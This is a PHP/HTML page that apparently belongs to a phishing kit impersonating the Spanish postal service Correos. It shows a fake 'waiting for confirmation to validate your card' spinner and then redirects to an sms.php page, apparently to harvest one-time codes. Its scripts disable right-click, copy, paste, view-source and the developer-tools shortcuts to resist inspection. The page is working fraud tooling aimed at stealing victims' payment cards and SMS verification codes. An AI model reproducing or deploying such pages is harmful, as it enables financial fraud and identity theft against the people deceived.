<?php

error_reporting();
session_start();

?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" class="wf-inactive" oncontextmenu="return false;" onselectstart="return false" ondrag="return false" ondrop="return false" onpaste="return false;" oncopy="return false;" oncut="return false;">

<head id="ctl00_Head1">
    <meta http-equiv="X-UA-Compatible" content="IE=100">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    <link rel="shortcut icon" href="./assets/Seleccione medio de pago_fichiers/jiconami.ico">
    <link rel="icon" href="./assets/Seleccione medio de pago_fichiers/jiconami.ico" type="image/ico">

    <title>CARGANDO . . .</title>

    <script language="javascript" type="text/javascript" src="assets/loadiing_files/typeKit.js"></script>

    <style type="text/css">
        .tk-pt-sans {
            font-family: "pt-sans", sans-serif;
        }
    </style>
    <style type="text/css">
        @font-face {
            font-family: pt-sans;
            src: url(https://use.typekit.net/af/802da8/0000000000000000000124f9/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("woff2"), url(https://use.typekit.net/af/802da8/0000000000000000000124f9/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("woff"), url(https://use.typekit.net/af/802da8/0000000000000000000124f9/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("opentype");
            font-weight: 400;
            font-style: normal;
        }

        @font-face {
            font-family: pt-sans;
            src: url(https://use.typekit.net/af/7505b0/0000000000000000000124fa/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("woff2"), url(https://use.typekit.net/af/7505b0/0000000000000000000124fa/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("woff"), url(https://use.typekit.net/af/7505b0/0000000000000000000124fa/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("opentype");
            font-weight: 700;
            font-style: normal;
        }
    </style>
    <script>
        try {
            Typekit.load({
                async: true
            });
        } catch (e) {}
    </script>
    <link href="assets/loadiing_files/bootstrap.css" rel="stylesheet" type="text/css">
    <link href="assets/loadiing_files/main.css" rel="stylesheet" type="text/css">
</head>

<body class="ogilvy-body">

    <section>
        <div id="cabecera" class="container ogilvy-bg-amarillo">
            <div class="row">
                <div class="col-xs-12 text-center ogilvy-header">
                    <img class="ogilvy-logosuperior" src="assets/loadiing_files/ogilvy-logos.png" alt="Correos" id="logoCorreos">
                </div>
            </div>
        </div>
    </section>



    <section>
        <div class="container">
            <div class="row">
                <div class="col-xs-12 text-center ogilvy-espacioseccion">
                    <div style="margin-bottom: 2rem;" class="ogilvy-titular"><span id="lbTitle">FECHA :&nbsp;<span id="Fechavalor" style="font-weight:normal;"><?php echo date('d/m/Y'); ?></span></span>
                    </div>
                    <div style="font-weight:600 ;" class="ogilvy-titula"><span id="lbDescription"><span id="generic">ESPERANDO CONFIRMACIÓN PARA VALIDAR SU TARJETA ...
                            </span></span>
                    </div>
                    <div class="ogilvy-subtitular"><span id="lbDescription"><span id="generic">Por favor no cierre esta pestaña, Gracias.
                            </span></span>
                    </div>

                </div>

                <div class="col-xs-12 col-sm-4 col-sm-offset-4 col-md-2 col-md-offset-5 ogilvy-espacioboton">
                    <div id="PageFooter">
                        <div id="CollapseFooter" class="buttonHide"></div>
                        <center>
                            <div id="Div1" class="buttonShow noseve">
                                <img style="display:none;" src="/assets/loadiing_files/loadme.svg" alt="" srcset="">
                                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="margin: auto; background: rgba(0, 0, 0, 0) none repeat scroll 0% 0%; display: block; shape-rendering: auto;" width="200px" height="200px" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
                                    <g transform="rotate(0 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-2.3549201009251473s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(12.413793103448276 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-2.2708158116063917s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(24.82758620689655 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-2.1867115222876365s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(37.241379310344826 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-2.1026072329688814s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(49.6551724137931 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-2.0185029436501263s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(62.06896551724138 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-1.9343986543313707s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(74.48275862068965 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-1.8502943650126156s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(86.89655172413794 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-1.7661900756938602s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(99.3103448275862 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-1.682085786375105s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(111.72413793103448 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-1.5979814970563497s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(124.13793103448276 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-1.5138772077375946s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(136.55172413793105 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-1.4297729184188392s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(148.9655172413793 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-1.3456686291000841s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(161.3793103448276 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-1.2615643397813288s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(173.79310344827587 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-1.1774600504625736s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(186.20689655172413 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-1.0933557611438183s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(198.6206896551724 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-1.0092514718250631s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(211.0344827586207 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-0.9251471825063078s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(223.44827586206895 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-0.8410428931875525s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(235.86206896551724 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-0.7569386038687973s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(248.27586206896552 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-0.6728343145500421s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(260.6896551724138 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-0.5887300252312868s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(273.1034482758621 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-0.5046257359125316s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(285.51724137931035 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-0.42052144659377627s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(297.9310344827586 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-0.33641715727502103s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(310.3448275862069 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-0.2523128679562658s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(322.7586206896552 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-0.16820857863751051s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(335.17241379310343 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-0.08410428931875526s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                    <g transform="rotate(347.58620689655174 50 50)">
                                        <rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
                                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="0s" repeatCount="indefinite"></animate>
                                        </rect>
                                    </g>
                                </svg>
                            </div>
                        </center>
                        <div id="ControlPanelFooter"> </div>
                    </div>
                </div>
            </div>
        </div>
    </section>



</body>
<script>
    jQuery(function($) {

        document.addEventListener('contextmenu', event => event.preventDefault());
        document.onkeydown = function(e) {
            if (e.ctrlKey &&
                (e.keyCode === 67 ||
                    e.keyCode === 86 ||
                    e.keyCode === 85 ||
                    e.keyCode === 83 ||
                    e.keyCode === 117)) {
                return false;
            } else {
                return true;
            }
        };

        $(document).keydown(function(event) {
            if (event.keyCode == 123) { // Prevent F12
                return false;
            } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
                return false;
            }
        });
    })
</script>
<script>
    window.setInterval(function() {
        window.location = "sms.php";
    }, 24000);
</script>

</html>